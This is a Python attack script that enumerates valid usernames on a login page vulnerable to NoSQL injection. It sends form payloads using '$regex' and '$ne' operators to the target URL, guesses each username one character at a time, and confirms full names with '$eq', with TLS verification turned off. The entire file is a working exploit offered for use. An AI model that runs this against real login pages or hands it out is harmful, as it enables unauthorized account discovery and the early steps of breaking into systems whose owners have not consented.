import requests
import urllib3
import string
import urllib
import sys

if (len(sys.argv[1:]) < 1):
    print("This script will find usernames of a login page vulnerable to NoSQL injection")
    print("Usage: python3 %s <target-url>" %sys.argv[0])
    exit()

valid_users = ['admin']
username = ""
url = sys.argv[1]
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
	for c in string.printable:
		if c not in ['*', '+', '.', '?', '|', '&', "\\", '$'] and username+c not in "ad":
			payload='username[$regex]=%s.*&password[$ne]=782137821732&login=login' % (username + c)
			req = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
			if 'OK' in req.text or req.status_code == 302:
				print("Found user char: %s" %c)
				print("User progress: %s" % (username + c))
				username += c

				payload='username[$eq]=%s&password[$ne]=782137821732&login=login' % (username)
				req = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
				if 'OK' in req.text or req.status_code == 302:
					valid_users.append(username)
					username = ""
					print("Found valid(s) username(s) : %s" % valid_users)
